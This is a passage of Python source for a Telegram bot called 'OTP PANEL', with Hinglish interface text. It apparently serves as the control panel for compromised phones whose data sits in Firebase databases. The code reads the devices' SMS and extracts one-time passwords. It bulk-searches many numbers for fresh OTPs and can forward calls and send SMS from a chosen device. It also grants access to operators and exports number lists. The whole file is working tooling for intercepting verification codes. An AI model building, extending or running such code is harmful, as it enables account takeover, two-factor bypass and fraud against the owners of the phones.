    "━━━━━━━━━━━━━━━━━━"
)

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    user = update.effective_user
    is_admin = (chat_id in ADMIN_IDS)

    if all_users.get(chat_id, {}).get("banned"):
        await update.message.reply_text("🚫 Aap banned hain.")
        return

    if chat_id not in all_users:
        all_users[chat_id] = {
            "name": user.full_name if user else "Unknown",
            "username": user.username or "" if user else "",
            "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
            "banned": False,
        }
        save_data()

    chats_registry.add(chat_id)

    if not has_access(chat_id):
        await update.message.reply_text(
            f"👋 Hello, <b>{user.first_name if user else 'User'}</b>!\n\n"
            f"🚫 <b>Access Required</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Aapka Account Registered ho gaya.\n"
            f"Bot use karne ke liye admin se access maangein.\n"
            f"Your ID: <code>{chat_id}</code>",
            parse_mode="HTML"
        )
        for admin_id in ADMIN_IDS:
            try:
                uname = f"@{user.username}" if user and user.username else "No username"
                await ctx.bot.send_message(
                    admin_id,
                    f"🔔 <b>New User Request</b>\n"
                    f"Name: {user.full_name if user else 'Unknown'}\n"
                    f"Username: {uname}\n"
                    f"ID: <code>{chat_id}</code>\n\n"
                    f"Access dene ke liye:\n<code>/grant {chat_id}</code>",
                    parse_mode="HTML"
                )
            except: pass
        return

    await update.message.reply_text(
        f"✨ OTP PANEL ✨\n━━━━━━━━━━━━━━━━━━\n"
        f"Welcome, <b>{user.first_name if user else 'User'}</b>! 👋\n"
        f"System online. Panels ready.",
        reply_markup=get_reply_menu(is_admin),
        parse_mode="HTML"
    )

async def cmd_grant(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS: return
    if not ctx.args:
        await update.message.reply_text("Usage: /grant <user_id>")
        return
    try:
        target_id = int(ctx.args[0])
        grant_access(target_id)
        udata = all_users.get(target_id, {})
        name = udata.get("name", "Unknown")
        await update.message.reply_text(f"✅ Access granted to {name} ({target_id})")
        try:
            await ctx.bot.send_message(
                target_id,
                "✅ <b>Access Granted!</b>\n\nAapko bot use karne ki ijazat mil gayi.\n/start likhein.",
                parse_mode="HTML"
            )
        except: pass
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid user ID.")

async def cmd_revoke(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS: return
    if not ctx.args:
        await update.message.reply_text("Usage: /revoke <user_id>")
        return
    try:
        target_id = int(ctx.args[0])
        revoke_access(target_id)
        await update.message.reply_text(f"❌ Access revoked for user {target_id}")
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid user ID.")

async def cmd_setadminpanel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS: return
    if not ctx.args:
        lines = ["🔒 <b>Admin-Only Panel Set karo</b>", "━━━━━━━━━━━━━━━━━━",
                 "Usage: <code>/setadminpanel TAG_NAME</code>", "",
                 "<b>Available Panels:</b>"]
        for tag in sorted(DATABASES.keys()):
            lock = "🔒 " if tag in ADMIN_ONLY_TAGS else "   "
            lines.append(f"{lock}<code>{tag}</code>")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
        return
    tag = ctx.args[0].strip()
    if tag not in DATABASES:
        await update.message.reply_text(f"❌ Panel '{tag}' nahi mila. Sahi TAG naam likho.")
        return
    ADMIN_ONLY_TAGS.add(tag)
    save_data()
    await update.message.reply_text(
        f"🔒 Panel <code>{tag}</code> ab <b>Admin-Only</b> ho gaya!\n"
        f"Users ko ab ye panel nahi dikhega.",
        parse_mode="HTML"
    )

async def cmd_unsetadminpanel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS: return
    if not ctx.args:
        if not ADMIN_ONLY_TAGS:
            await update.message.reply_text("ℹ️ Abhi koi admin-only panel set nahi hai.")
            return
        lines = ["🔓 <b>Admin-Only Panels (unlock karo):</b>", "━━━━━━━━━━━━━━━━━━",
                 "Usage: <code>/unsetadminpanel TAG_NAME</code>", ""]
        for tag in sorted(ADMIN_ONLY_TAGS):
            lines.append(f"🔒 <code>{tag}</code>")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
        return
    tag = ctx.args[0].strip()
    if tag not in ADMIN_ONLY_TAGS:
        await update.message.reply_text(f"ℹ️ Panel '{tag}' admin-only nahi था।")
        return
    ADMIN_ONLY_TAGS.discard(tag)
    save_data()
    await update.message.reply_text(
        f"🔓 Panel <code>{tag}</code> ab <b>sab ko visible</b> ho gaya!",
        parse_mode="HTML"
    )

async def cmd_adminpanels(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS: return
    if not ADMIN_ONLY_TAGS:
        await update.message.reply_text("ℹ️ Koi panel admin-only set nahi hai abhi.")
        return
    lines = [f"🔒 <b>Admin-Only Panels ({len(ADMIN_ONLY_TAGS)} total):</b>", "━━━━━━━━━━━━━━━━━━"]
    for tag in sorted(ADMIN_ONLY_TAGS):
        lines.append(f"🔒 <code>{tag}</code>")
    lines += ["━━━━━━━━━━━━━━━━━━", "Unhide: <code>/unsetadminpanel TAG</code>"]
    await update.message.reply_text("\n".join(lines), parse_mode="HTML")

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    data = query.data or ""
    chat_id = query.message.chat_id
    is_admin = (chat_id in ADMIN_IDS)

    if all_users.get(chat_id, {}).get("banned") or is_spamming(chat_id):
        await query.answer(); return

    if data == "noop": await query.answer(); return
    if data == "close_msg":
        await query.answer()
        try: await query.message.delete()
        except: pass
        return

    if not has_access(chat_id):
        await query.answer("🚫 Access nahi hai!", show_alert=True)
        return

    await query.answer()

    if data in ("home",) or data.startswith("backpg:") or data.startswith("pg:"):
        user_focus.pop(chat_id, None)
        pg = 0
        if data.startswith("backpg:") or data.startswith("pg:"):
            try: pg = int(data.split(":")[1])
            except: pg = 0
        user_page[chat_id] = pg
        devices = await get_all_devices(is_admin)
        await safe_edit(query, device_list_header(devices, pg), reply_markup=device_list_keyboard(devices, pg))
        return

    if data == "panels":
        user_focus.pop(chat_id, None)
        visible_tags = [t for t in DATABASES if is_admin or t not in ADMIN_ONLY_TAGS]
        total_panels = len(visible_tags)
        total_devs = sum(len(GLOBAL_DEVICE_CACHE.get(t, [])) for t in visible_tags)
        grand_online = sum(
            sum(1 for d in GLOBAL_DEVICE_CACHE.get(t, []) if d.status == "online")
            for t in visible_tags
        )
        header = (f"🗂 <b>ALL PANELS</b>\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"📡 Panels: {total_panels}  |  📱 Devices: {total_devs}\n"
                  f"🟢 Online: {grand_online}  🔴 Offline: {total_devs - grand_online}\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"Panel pe click karo → us panel ke numbers dikhenge:")
        await safe_edit(query, header, reply_markup=panels_list_keyboard(is_admin=is_admin))
        return

    if data == "online":
        devices = await get_all_devices(is_admin)
        await safe_edit(query, "🟢 ONLINE NUMBERS", reply_markup=online_only_keyboard(devices))
        return

    if data.startswith("panel:"):
        safe_tag = data[6:]
        original_tag = find_tag_by_safe(safe_tag)
        if not original_tag:
            await safe_edit(query, "❌ Panel nahi mila.")
            return
        if original_tag in ADMIN_ONLY_TAGS and not is_admin:
            await query.answer("🚫 Aapke paas is panel ka access nahi hai!", show_alert=True)
            return
        devices = await get_panel_devices(original_tag)
        text = panel_numbers_text(original_tag, devices)
        await safe_edit(query, text, reply_markup=panel_numbers_keyboard(original_tag, devices))
        return

    if data.startswith("bulksearch_panel:") and is_admin:
        safe_tag = data[17:]
        original_tag = find_tag_by_safe(safe_tag)
        if not original_tag:
            await safe_edit(query, "❌ Panel nahi mila.")
            return
        devices = await get_panel_devices(original_tag, is_admin=True)
        online_devices = [d for d in devices if d.status == "online" and d.numbers]
        if not online_devices:
            await safe_edit(
                query,
                f"📡 <b>{original_tag}</b>\n\n😴 Is panel mein koi online device nahi hai.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="bulksearch_back")]])
            )
            return

        try:
            await query.edit_message_text(
                f"⏳ <b>{original_tag}</b> panel check ho raha hai...\n"
                f"🟢 {len(online_devices)} online devices ke SMS check ho rahe hain...",
                parse_mode="HTML"
            )
        except Exception: pass

        sms_tasks = await asyncio.gather(*(get_device_sms(d, limit=20) for d in online_devices))
        today = datetime.now().date()
        yesterday = today - timedelta(days=1)
        tomorrow  = today + timedelta(days=1)

        matched_numbers = []
        for d, smss in zip(online_devices, sms_tasks):
            has_recent_otp = False
            latest_otp = None
            latest_date = None
            for sms in smss:
                body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                otp = extract_otp(body)
                if otp and otp_in_date_range(sms):
                    has_recent_otp = True
                    latest_otp = otp
                    latest_date = sms_date(sms)
                    break
            if has_recent_otp:
                matched_numbers.append((d, latest_otp, latest_date))

        if not matched_numbers:
            result_text = (
                f"📡 <b>{original_tag}</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🟢 Online check kiye: {len(online_devices)}\n"
                f"📅 Date range: {yesterday} → {tomorrow}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"❌ Kisi bhi online number pe aaj/kal/parson ka OTP nahi mila."
            )
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="bulksearch_back"),
                                        InlineKeyboardButton("❌ Close", callback_data="close_msg")]])
            await safe_edit(query, result_text, reply_markup=kb)
            return

        lines = [
            f"✅ <b>Bulk Search — {original_tag}</b>",
            f"━━━━━━━━━━━━━━━━━━",
            f"🟢 Online checked: {len(online_devices)}",
            f"🎯 OTP mila (aaj/kal/parson): {len(matched_numbers)}",
            f"📅 Range: {yesterday} / {today} / {tomorrow}",
            f"━━━━━━━━━━━━━━━━━━",
        ]
        num_only_lines = []
        for i, (d, otp, dt) in enumerate(matched_numbers, 1):
            num_str = d.numbers[0] if d.numbers else d.name
            lines.append(f"{i}. 🟢 {num_str}  🔑 {otp}  📅 {dt}")
            num_only_lines.append(num_str)
        lines.append("━━━━━━━━━━━━━━━━━━")
        lines.append("📋 <b>Sirf Numbers (copy karo):</b>")
        lines.append("\n".join(num_only_lines))

        full_text = "\n".join(lines)
        rows = []
        for d, otp, dt in matched_numbers[:20]:
            lbl = f"🟢 {d.numbers[0] if d.numbers else d.name}  🔑 {otp}"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
        rows.append([InlineKeyboardButton("🔙 Back", callback_data="bulksearch_back"),
                     InlineKeyboardButton("❌ Close", callback_data="close_msg")])
        if len(full_text) > 4000:
            full_text = full_text[:3990] + "\n..."
        await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(rows))
        return

    if data == "bulksearch_back" and is_admin:
        header = (f"🔍 <b>BULK SEARCH</b>\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"Panel select karo — sirf online numbers jinka OTP\n"
                  f"aaj / kal / parson aaya ho, wahi milenge.\n"
                  f"━━━━━━━━━━━━━━━━━━")
        await safe_edit(query, header, reply_markup=bulksearch_panels_keyboard())
        return

    if data.startswith("panelref:"):
        safe_tag = data[9:]
        original_tag = find_tag_by_safe(safe_tag)
        if not original_tag:
            await safe_edit(query, "❌ Panel nahi mila.")
            return
        url = DATABASES.get(original_tag, "")
        if url:
            GLOBAL_DEVICE_CACHE[original_tag] = await fetch_db_data(original_tag, url)
        devices = await get_panel_devices(original_tag)
        text = panel_numbers_text(original_tag, devices)
        await safe_edit(query, text, reply_markup=panel_numbers_keyboard(original_tag, devices))
        return

    if data.startswith("sel:"):
        dev_id = data[4:]
        devices = await get_all_devices(is_admin)
        device = next((d for d in devices if d.id == dev_id), None)
        if not device: return
        if not is_admin and device.db_tag in ADMIN_ONLY_TAGS:
            await query.answer("🚫 Aapke paas is device ka access nahi hai!", show_alert=True)
            return

        # NOTE: user_focus intentionally NOT set here — stops auto-forward spam on device open
        user_focus.pop(chat_id, None)
        back_page = user_page.get(chat_id, 0)

        latest_otp_line = ""
        try:
            # Seed ALL recent SMS keys so old messages don't retrigger
            recent = await get_device_sms(device, limit=SMS_LIMIT)
            for sms_item in recent:
                sms_key = sms_item.get("_key", "")
                if sms_key:
                    seen_ids.add(seen_key(dev_id, sms_key))

            if recent:
                body = recent[0].get("body") or recent[0].get("message") or recent[0].get("text") or ""
                otp = extract_otp(body)
                if otp:
                    latest_otp_line = f"\n🔑 Latest OTP: <code>{otp}</code>\n📅 {sms_date(recent[0])}"
        except Exception: pass

        text = (f"📱 DEVICE TERMINAL\n━━━━━━━━━━━━━━━━━━\n"
                f"Number: {device_label(device)}\nStatus: {device.status}\n"
                f"Server Node: {device.db_tag}{latest_otp_line}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🔄 Refresh dabao naya OTP dekhne ke liye.")
        await safe_edit(query, text, reply_markup=device_action_keyboard(dev_id, back_page))
        return

    if data.startswith("msgs:"):
        dev_id = data[5:]
        devices = await get_all_devices(is_admin)
        device = next((d for d in devices if d.id == dev_id), None)
        if not device: return
        if not is_admin and device.db_tag in ADMIN_ONLY_TAGS:
            await query.answer("🚫 Access nahi hai!", show_alert=True); return
        smss = await get_device_sms(device)
        if not smss:
            await safe_edit(query, "📭 No SMS found.",
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data=f"sel:{dev_id}")]]))
            return
        body_parts, otp_buttons = [], []
        for sms in smss:
            block, otp = format_sms_block(sms, device_label(device))
            body_parts.append(block)
            if otp: otp_buttons.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
        otp_buttons.append([InlineKeyboardButton("🔙 Back to Terminal", callback_data=f"sel:{dev_id}")])
        full_text = "\n━━━━━━━━━━━━━━━━━━\n\n".join(body_parts)[:4000]
        await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons))
        return

    if data.startswith("info:"):
        dev_id = data[5:]
        devices = await get_all_devices(is_admin)
        device = next((d for d in devices if d.id == dev_id), None)
        if not device: return
        if not is_admin and device.db_tag in ADMIN_ONLY_TAGS:
            await query.answer("🚫 Access nahi hai!", show_alert=True); return
        await query.message.reply_text(
            f"📱 Device Info:\n\n{device.device_info}\n🔋 Battery: {parse_battery(device.battery)}%\n📶 Network: {device.status}"
        )
        return

    if data.startswith("cf:"):
        pending_action[chat_id] = {"action": "execute_cf", "dev_id": data[3:]}
        await query.message.reply_text("📞 Forwarding number type karke send karein (e.g. `+919999911111`)")
        return

    if data.startswith("ss:"):
        pending_action[chat_id] = {"action": "execute_ss", "dev_id": data[3:]}
        await query.message.reply_text("💬 Format me send karein:\n`TARGET_NUMBER:MESSAGE_BODY`")
        return

    if data.startswith("cp:"):
        await query.answer(f"OTP: {data[3:]}", show_alert=True); return

    # ── Keyword search confirm / cancel ─────────────────────────────────
    if data.startswith("kw_confirm:"):
        target_id = int(data[11:])
        if chat_id != target_id:
            await query.answer("Yeh aapka confirm nahi hai!", show_alert=True); return
        keyword = pending_kw_confirm.pop(chat_id, None)
        if not keyword:
            await query.answer("Session expire ho gaya. Dobara keyword daalo.", show_alert=True); return
        await query.answer("✅ Poora search shuru...")
        try: await query.message.delete()
        except: pass
        await _run_full_keyword_search(chat_id, keyword, is_admin, query.message.chat_id, ctx)
        return

    if data.startswith("kw_cancel:"):
        target_id = int(data[10:])
        if chat_id != target_id:
            await query.answer(); return
        pending_kw_confirm.pop(chat_id, None)
        await query.answer("❌ Search cancel ho gaya.", show_alert=True)
        try: await query.message.delete()
        except: pass
        return

    if data == "admin_refresh" and is_admin:
        await safe_edit(query, admin_panel_text(), reply_markup=admin_keyboard()); return

    if data == "admin_add_main_db" and is_admin:
        pending_action[chat_id] = {"action": "add_bulk_db"}
        await query.message.reply_text(
            "📝 Format:\n`TAG=https://your-url.firebaseio.com`\n\nEk sath max 20 URLs daal sakte hain.",
            parse_mode="Markdown"
        ); return

    if data == "admin_grant_access" and is_admin:
        pending_action[chat_id] = {"action": "grant_access_pipe"}
        await query.message.reply_text(
            "✅ Jis user ko access dena hai uska User ID bhejein:\n"
            "(User ID: /start karne par bot bata deta hai)",
            parse_mode="HTML"
        ); return

    if data == "admin_revoke_access" and is_admin:
        pending_action[chat_id] = {"action": "revoke_access_pipe"}
        await query.message.reply_text("❌ Jis user ka access hatana hai uska User ID bhejein:"); return

    if data == "admin_access_list" and is_admin:
        if not allowed_users:
            text = "🔐 <b>Access List</b>\n\nAbhi koi allowed user nahi hai."
        else:
            lines = ["🔐 <b>Allowed Users:</b>"]
            for uid in list(allowed_users)[:30]:
                udata = all_users.get(uid, {})
                name = udata.get("name", "Unknown")
                uname = udata.get("username", "")
                lines.append(f"• {name} (@{uname}) — <code>{uid}</code>")
            text = "\n".join(lines)
        await query.message.reply_text(text, parse_mode="HTML"); return

    if data == "admin_setadmin_list" and is_admin:
        await safe_edit(query, admin_setadmin_text(), reply_markup=admin_setadmin_keyboard()); return

    if data.startswith("toggleadmin:") and is_admin:
        safe_tag = data[12:]
        original_tag = find_tag_by_safe(safe_tag)
        if not original_tag:
            await query.answer("❌ Panel nahi mila!", show_alert=True); return
        if original_tag in ADMIN_ONLY_TAGS:
            ADMIN_ONLY_TAGS.discard(original_tag)
            await query.answer(f"🔓 '{original_tag}' ab sab ko visible hai!", show_alert=True)
        else:
            ADMIN_ONLY_TAGS.add(original_tag)
            await query.answer(f"🔒 '{original_tag}' ab Admin-Only hai!", show_alert=True)
        save_data()
        await safe_edit(query, admin_setadmin_text(), reply_markup=admin_setadmin_keyboard()); return

    if data == "admin_broadcast" and is_admin:
        pending_action[chat_id] = {"action": "broadcast_msg"}
        await query.message.reply_text("📢 Broadcast message likhke bhejien:"); return

    if data == "admin_users" and is_admin:
        total = len(all_users)
        text = f"👥 <b>Total Users:</b> {total}\n\n"
        for count, (uid, udata) in enumerate(list(all_users.items())[:30], 1):
            access_icon = "✅" if has_access(uid) else "🚫"
            text += f"{count}. {access_icon} {udata.get('name','Unknown')} (<code>{uid}</code>)\n"
        await query.message.reply_text(text, parse_mode="HTML"); return

# ═══════════════════════════════════════════════════════
#  FULL KEYWORD SEARCH HELPER (called after user confirms)
# ═══════════════════════════════════════════════════════

async def _run_full_keyword_search(chat_id: int, keyword: str, is_admin: bool, send_to: int, ctx) -> None:
    import io
    esc_kw   = html_escape(keyword)
    wait_msg = await ctx.bot.send_message(
        send_to,
        f"🔎 Poora search chal raha hai — keyword <code>{esc_kw}</code>...\n⏳ Wait karein...",
        parse_mode="HTML"
    )

    devices = await get_all_devices(is_admin)
    devices_with_nums = [d for d in devices if d.numbers]

    kw_sem = asyncio.Semaphore(30)
    async def _fetch(d):
        async with kw_sem:
            return await get_device_sms(d, limit=SMS_LIMIT)

    sms_results = await asyncio.gather(*(_fetch(d) for d in devices_with_nums), return_exceptions=True)

    no_keyword_numbers = []
    no_sms_skipped     = 0
    keyword_matched    = 0

    for d, smss in zip(devices_with_nums, sms_results):
        if isinstance(smss, Exception) or not smss:
            no_sms_skipped += 1
            continue
        keyword_found = False
        for sms in smss:
            body = (sms.get("body") or sms.get("message") or sms.get("text") or "").lower()
            if keyword in body:
                keyword_found = True
                break
        if keyword_found:
            keyword_matched += 1
        else:
            latest_sms   = smss[0]
            body_preview = (latest_sms.get("body") or latest_sms.get("message") or latest_sms.get("text") or "")[:80]
            no_keyword_numbers.append((d, latest_sms, body_preview))

    try: await wait_msg.delete()
    except: pass

    total_checked = len(devices_with_nums)
    found_count   = len(no_keyword_numbers)

    if not no_keyword_numbers:
        await ctx.bot.send_message(
            send_to,
            f"🔎 <b>Keyword Search: <code>{esc_kw}</code></b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📱 Checked: {total_checked}  |  ✅ Keyword mila (skip): {keyword_matched}  |  ⏭ No SMS: {no_sms_skipped}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"✅ Sabhi numbers mein keyword mila — koi result nahi.",
            parse_mode="HTML"
        )
        return

    header = (
        f"🔎 <b>Keyword Search: <code>{esc_kw}</code></b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📱 Checked: {total_checked}  |  ✅ Skip (matched): {keyword_matched}  |  ⏭ No SMS: {no_sms_skipped}\n"
        f"🎯 Keyword NAHI mila: <b>{found_count}</b> numbers\n"
        f"━━━━━━━━━━━━━━━━━━\n"
    )
    lines = []
    rows  = []
    for i, (d, latest_sms, preview) in enumerate(no_keyword_numbers[:30], 1):
        icon    = "🟢" if d.status == "online" else "🔴"
        num_str = d.numbers[0] if d.numbers else d.name
        dt      = sms_date(latest_sms)
        lines.append(f"{i}. {icon} {html_escape(num_str)}  [{html_escape(d.db_tag)}]  📅 {dt}\n    💬 {html_escape(preview)}...")
        if i <= 15:
            rows.append([InlineKeyboardButton(f"{icon} {num_str}", callback_data=f"sel:{d.id}")])

    full_text = header + "\n".join(lines)
    if len(full_text) > 4000:
        full_text = full_text[:3990] + "\n..."
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    await ctx.bot.send_message(send_to, full_text, reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")

    # .txt file with ALL non-matching numbers
    all_nums = [d.numbers[0] if d.numbers else d.name for d, _, __ in no_keyword_numbers]
    file_content = (
        f"Keyword Search: {keyword}\n"
        f"Checked: {total_checked} | Mila+Skip: {keyword_matched} | No SMS: {no_sms_skipped}\n"
        f"Keyword NAHI mila: {found_count} numbers\n"
        f"{'='*40}\n"
        + "\n".join(all_nums)
    ).encode("utf-8")
    file_obj      = io.BytesIO(file_content)
    file_obj.name = f"keyword_{keyword[:20]}.txt"
    await ctx.bot.send_document(
        send_to,
        document=file_obj,
        filename=file_obj.name,
        caption=f"📄 <code>{esc_kw}</code> — {found_count} numbers (keyword nahi mila)",
        parse_mode="HTML"
    )

# ═══════════════════════════════════════════════════════
#  DOCUMENT HANDLER — .txt file se bulk number search
# ═══════════════════════════════════════════════════════

async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    is_admin = (chat_id in ADMIN_IDS)
    if not has_access(chat_id):
        await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML"); return
    if all_users.get(chat_id, {}).get("banned"): return

    doc = update.message.document
    if not doc: return

    # Sirf .txt ya plain text files accept karo
    fname = doc.file_name or ""
    mime  = doc.mime_type or ""
    if not (fname.endswith(".txt") or "text" in mime):
        await update.message.reply_text("⚠️ Sirf .txt file bhejein jisme numbers hon (ek per line).")
        return

    if doc.file_size and doc.file_size > 500_000:
        await update.message.reply_text("⚠️ File bahut badi hai (max 500KB).")
        return

    wait_msg = await update.message.reply_text("📂 File padh raha hoon...")
    try:
        tg_file = await ctx.bot.get_file(doc.file_id)
        import io as _io
        buf = _io.BytesIO()
        await tg_file.download_to_memory(buf)
        content = buf.getvalue().decode("utf-8", errors="ignore")
    except Exception as e:
        await wait_msg.edit_text(f"❌ File download error: {e}")
        return

    # Extract numbers from file content
    raw_queries = re.split(r"[\n,;\s]+", content.strip())
    queries = [re.sub(r"\D", "", q) for q in raw_queries if len(re.sub(r"\D", "", q)) >= 8]
    queries = list(dict.fromkeys(queries))

    if not queries:
        await wait_msg.edit_text("❌ File mein koi valid number nahi mila (min 8 digits chahiye).")
        return

    await wait_msg.edit_text(
        f"📂 File mein <b>{len(queries)}</b> numbers mile.\n🔍 Search ho raha hai...",
        parse_mode="HTML"
    )

    devices = await get_all_devices(is_admin)

    # Pre-build index for fast lookup
    device_num_index = {}
    for d in devices:
        for num in d.numbers:
            clean = re.sub(r"\D", "", num)
            if clean not in device_num_index:
                device_num_index[clean] = []
            device_num_index[clean].append(d)

    results_found   = []
    results_missing = []
    for q in queries:
        matched = []
        for stored_num, devs in device_num_index.items():
            if q in stored_num or stored_num in q:
                for d in devs:
                    if d not in matched:
                        matched.append(d)
        if matched: results_found.append((q, matched))
        else:       results_missing.append(q)

    try: await wait_msg.delete()
    except: pass

    found_c = len(results_found)
    miss_c  = len(results_missing)

    summary = (
        f"🎯 <b>File Bulk Search Results</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📋 File mein numbers : <b>{len(queries)}</b>\n"
        f"✅ Mila              : <b>{found_c}</b>\n"
        f"❌ Nahi Mila         : <b>{miss_c}</b>\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    rows = []
    for q, devs in results_found[:20]:
        d = devs[0]
        icon = "🟢" if d.status == "online" else "🔴"
        num_label = d.numbers[0] if d.numbers else d.name
        rows.append([InlineKeyboardButton(f"{icon} {q} → [{d.db_tag}] {num_label}", callback_data=f"sel:{d.id}")])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    await update.message.reply_text(summary, reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")

    # Full result as .txt file
    import io
    file_lines = [
        f"=== FILE BULK SEARCH RESULTS ===",
        f"Source file: {fname}",
        f"Total: {len(queries)} | Mila: {found_c} | Nahi Mila: {miss_c}",
        f"{'='*40}", "",
        "✅ MILA (Found):",
    ]
    for q, devs in results_found:
        d = devs[0]
        status = "ONLINE" if d.status == "online" else "offline"
        num_label = d.numbers[0] if d.numbers else d.name
        file_lines.append(f"  {q}  →  [{d.db_tag}] {num_label}  ({status})")
    file_lines += ["", "❌ NAHI MILA (Not Found):"]
    for q in results_missing:
        file_lines.append(f"  {q}")

    file_bytes = "\n".join(file_lines).encode("utf-8")
    file_obj   = io.BytesIO(file_bytes)
    file_obj.name = "bulk_result.txt"
    await update.message.reply_document(
        document=file_obj,
        filename="bulk_result.txt",
        caption=f"📄 Full result — {found_c} mila, {miss_c} nahi mila",
    )

# ═══════════════════════════════════════════════════════
#  TEXT HANDLER & INPUT PIPELINES
# ═══════════════════════════════════════════════════════

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    global DATABASES
    chat_id = update.effective_chat.id
    text = (update.message.text or "").strip()
    is_admin = (chat_id in ADMIN_IDS)

    if all_users.get(chat_id, {}).get("banned") or is_spamming(chat_id): return

    if chat_id in pending_action:
        act_data = pending_action.pop(chat_id)
        action = act_data["action"]

        if action == "search_num_pipe":
            if not has_access(chat_id):
                await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML"); return
            devices = await get_all_devices(is_admin)
            clean_q = re.sub(r"\D", "", text)
            found = [
                d for d in devices
                if any(clean_q in re.sub(r"\D", "", num) for num in d.numbers)
                and (is_admin or d.db_tag not in ADMIN_ONLY_TAGS)
            ]
            if found:
                rows = [[InlineKeyboardButton(
                    f"📱 [{fd.db_tag}] {fd.numbers[0] if fd.numbers else fd.name}",
                    callback_data=f"sel:{fd.id}"
                )] for fd in found[:15]]
                await update.message.reply_text("🎯 Matched Targets:", reply_markup=InlineKeyboardMarkup(rows))
            else:
                await update.message.reply_text("❌ Yeh number kisi bhi database mein nahi mila.")
            return

        if action == "bulk_search_pipe":
            if not has_access(chat_id):
                await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML"); return
            raw_queries = re.split(r"[\n,;\s]+", text.strip())
            queries = [re.sub(r"\D", "", q) for q in raw_queries if len(re.sub(r"\D", "", q)) >= 8]
            queries = list(dict.fromkeys(queries))  # remove duplicates, keep order

            if not queries:
                await update.message.reply_text("❌ Koi valid number nahi mila (min 8 digits chahiye).")
                return

            devices = await get_all_devices(is_admin)
            # Pre-build device number index for fast lookup
            device_num_index = {}
            for d in devices:
                for num in d.numbers:
                    clean = re.sub(r"\D", "", num)
                    if clean not in device_num_index:
                        device_num_index[clean] = []
                    device_num_index[clean].append(d)

            wait_msg = await update.message.reply_text(
                f"🔍 <b>{len(queries)}</b> numbers search ho rahe hain...\n⏳ Wait karein...",
                parse_mode="HTML"
            )

            results_found   = []
            results_missing = []

            for q in queries:
                matched = []
                for stored_num, devs in device_num_index.items():
                    if q in stored_num or stored_num in q:
                        for d in devs:
                            if d not in matched:
                                matched.append(d)
                if matched:
                    results_found.append((q, matched))
                else:
                    results_missing.append(q)

            try: await wait_msg.delete()
            except: pass

            total   = len(queries)
            found_c = len(results_found)
            miss_c  = len(results_missing)

            # ── Summary message ──────────────────────────────────────
            summary = (
                f"🎯 <b>Bulk Search Results</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"📋 Total searched : <b>{total}</b>\n"
                f"✅ Mila           : <b>{found_c}</b>\n"
                f"❌ Nahi Mila      : <b>{miss_c}</b>\n"
                f"━━━━━━━━━━━━━━━━━━"
            )

            # Show first 20 found as inline buttons
            rows = []
            for q, devs in results_found[:20]:
                d = devs[0]
                icon = "🟢" if d.status == "online" else "🔴"
                num_label = d.numbers[0] if d.numbers else d.name
                rows.append([InlineKeyboardButton(
                    f"{icon} {q} → [{d.db_tag}] {num_label}",
                    callback_data=f"sel:{d.id}"
                )])
            rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
            await update.message.reply_text(summary, reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")

            # ── Send full results as .txt file ────────────────────────
            import io
            file_lines = [
                f"=== BULK SEARCH RESULTS ===",
                f"Total: {total} | Mila: {found_c} | Nahi Mila: {miss_c}",
                f"{'='*40}",
                "",
                "✅ MILA (Found):",
            ]
            for q, devs in results_found:
                d = devs[0]
                status = "ONLINE" if d.status == "online" else "offline"
                num_label = d.numbers[0] if d.numbers else d.name
                file_lines.append(f"  {q}  →  [{d.db_tag}] {num_label}  ({status})")

